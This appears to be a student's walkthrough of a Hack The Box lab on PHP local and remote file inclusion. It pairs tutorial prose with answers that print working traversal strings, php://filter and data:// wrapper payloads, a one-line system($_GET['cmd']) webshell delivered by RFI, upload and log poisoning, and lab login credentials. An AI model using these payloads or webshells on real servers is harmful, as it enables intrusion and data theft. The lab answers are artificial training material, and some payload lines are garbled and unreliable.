# File Inclusions

Many modern back-end languages, such as `PHP`, `Javascript`, or `Java`, use HTTP parameters to specify what is shown on the web page, which allows for building dynamic web pages, reduces the script's overall size, and simplifies the code. In such cases, parameters are used to specify which resource is shown on the page. If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a [Local File Inclusion (LFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) vulnerability.

## Local File Inclusion (LFI)

The most common place we usually find LFI within is templating engines. In order to have most of the web application looking the same when navigating between pages, a templating engine displays a page that shows the common static parts, such as the `header`, `navigation bar`, and `footer`, and then dynamically loads other content that changes between pages. Otherwise, every page on the server would need to be modified when changes are made to any of the static parts. This is why we often see a parameter like `/index.php?page=about`, where `index.php` sets static content (e.g. header/footer), and then only pulls the dynamic content specified in the parameter, which in this case may be read from a file called `about.php`. As we have control over the `about` portion of the request, it may be possible to have the web application grab other files and display them on the page.

## Path traversal

The absolute path is when you specify it as /etc/passwd. This would work if the whole input was used within the `include()` function without any additions, like the following example: 
```php
include($_GET['language']);
```
n this case, if we try to read `/etc/passwd`, then the `include()` function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the `language` parameter. For example, the `language` parameter may be used for the filename, and may be added after a directory, as follows:
```php
include("./languages/" . $_GET['language']);
```
In this case, if we attempt to read `/etc/passwd`, then the path passed to `include()` would be (`./languages//etc/passwd`), and as this file does not exist, we will not be able to read anything.
We can easily bypass this restriction by traversing directories using `relative paths`. To do so, we can add `../` before our file name, which refers to the parent directory. For example, if the full path of the languages directory is `/var/www/html/languages/`, then using `../index.php` would refer to the `index.php` file on the parent directory (i.e. `/var/www/html/index.php`).
It can always be useful to be efficient and not add unnecessary `../` several times, especially if we were writing a report or writing an exploit. So, always try to find the minimum number of `../` that works and use it. You may also be able to calculate how many directories you are away from the root path and use that many. For example, with `/var/www/html/` we are `3` directories away from the root path, so we can use `../` 3 times (i.e. `../../../`).

## LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are LFISuite, LFiFreak, and liffy. We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated python2, so using them may not be a long term solution.

# Questions & Answers

### Local File Inclusion (LFI)

1. Using the file inclusion find the name of a user on the system that starts with "b".
```r
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.
```r
http://94.237.59.63:51622/index.php?language=../../../../usr/share/flags/flag.txt 
```

### Basic Bypasses

3. The above web application employs more than one filter to avoid LFI exploitation. Try to bypass these filters to read /flag.txt
```r
http://83.136.252.57:46408/index.php?language=languages/....//....//....//....//....//....//....//flag.txt
```

### PHP filters

4. Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

We use the same wordlist for directories as always and  we got 'configure' from ffuf, so that's why we inserted it at the end of the our url:
```r
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.53.113:48098/FUZZ.php

http://94.237.53.113:48098/index.php?language=php://filter/read=convert.base64-encode/resource=configure 
```

The next step is to decode from base64:
```c
echo PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0 | base64 -d
```

### PHP Wrappers

5. Try to gain RCE using one of the PHP wrappers and read the flag at / 
```r
echo '<?php system($_GET["cmd"]); ?>' | base64


http://94.237.59.63:42209/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/


http://94.237.59.63:42209/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt
```

### Remote File Inclusion (RFI)

6. Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in / 

Create a php code for shell:
```r
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Run pygtpdlib ftp server for retrieving response:
```r
sudo python -m pyftpdlib -p 21 
```

Then we need to list where our flag is
```r
http://IP/index.php?language=ftp://VM_IP/shell.php&cmd=ls+/ 

http://IP/index.php?language=ftp://VM_IP/shell.php&cmd=cat+/exercise/flag.txt 
```

### LFI File Uploads

7. Use any of the techniques covered in this section to gain RCE and read the flag at 

I decided to use simple file upload to:
```r
http://<SERVER_IP>:<PORT>/settings.php
```

Upload that gif to settings.php page and then return to the main:
```r
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

This is to check that LFI is working:
```r
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Then we simply need to list the directories and once we locate the flag.txt file, we 'cat' it:
```r
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=ls+l+/

http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt
```

### Log poisoning

8. Use any of the techniques covered in this section to gain RCE, then submit the output of the following command: pwd 

First we test for LFI:
```r
http://IP:PORT/index.php?language=../../../../etc/passwd 
```

Then intercept the request with burp and change the user agent to the following php code and change the url respectively:
```r
<?php  system($_GET['cmd']);?>

http://IP:PORT/index.php?language=../../../../var/log/apache2/access.log

http://IP:PORT/index.php?language=../../../../var/log/access.log&apache2&cmd=pwd! 
```

9. Try to use a different technique to gain RCE and read the flag at / 

So we basically need to cat all files and use the same url as for prev question:
```r
http://IP:PORT/index.php?language=../../../../var/log/access.log&apache2&cmd=pwd! 
```

Don't forget to set the user agent to php code that gets RCE

Then the request in burp will look like this when we need to discover what files there are:
```r
GET /index.php?language=../../../../var/log/apache2/access.log&cmd=ls+l+/
```

 We find some long .txt file, so simply cat it 
```r
GET /index.php?language=../../../../var/log/apache2/access.log&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
```

### Automatic Scanning 

10. Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt 

First we fuzz for parameters:
```c
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs filter by size (i.e. -fs 227)
```

When we get the parameter, in our case it is "view", we need to ffuz again but now using another wordlist for that
```c
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.53.113:48362/index.php?view=FUZZ' -fs 1935
```

Then when we get the response, we can try the payloads one by one on the url until we see that it is displaying the /etc/passwd
in our case it is ../../../../../../../../../../../../../../../../../../../../../../etc/passwd. So we add it and the simply remove /etc/passwd/ and insert /flag.txt:
```r
http://94.237.53.113:48362/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt
```

### File Inclusion Prevention

11. What is the full path to the php.ini file for Apache? (SSH to IP (ACADEMY-LFI-HARDEN) with user "htb-student" and password "HTB_@cademy_stdnt!" )
```r
sudo find / -name php.ini
```

## Skills Assessment

The company INLANEFREIGHT has contracted you to perform a web application assessment against one of their public-facing websites. They have been through many assessments in the past but have added some new functionality in a hurry and are particularly concerned about file inclusion/path traversal vulnerabilities.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application checking for file inclusion and path traversal vulnerabilities.

Find the vulnerabilities and submit a final flag using the skills we covered in the module sections to complete this module.

12. Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. 
![](https://i.imgur.com/ATYXZHj.png)

Testing:
```c
/index.php?page=..%252F..%252F..%252F..%252Fetc%252Fpasswd - invalid input detected

/index.php?page=php://filter/read=convert.base64-encode/resource=index - shows base64 code
```

We know the php://filter attack vector can bypass detection by the website.

Decode the Base64 index.php code in:
```r
https://www.base64decode.org/
```

ilf_admin/index.php is discovered from index.php

So we go to:
```r
http://165.232.98.156:30234/ilf_admin/index.php?log=http.log
```

![](https://i.imgur.com/goMnFSC.png)
```r
GET /ilf_admin/index.php?log=../../../../../etc/passwd
```
![](https://i.imgur.com/sBWla3Q.png)
```r
GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log

User-Agent: Mozilla/5.0 <evil.php payload> Gecko/20100101 Firefox/102.0

evil.php payload: <?php php system($_GET['cmd']); ? >
```
![](https://i.imgur.com/fr6tDp1.png)

Then ls+/ but decode it as url:

![](https://i.imgur.com/RgGQKSw.png)

And read the flag_... by cat+/
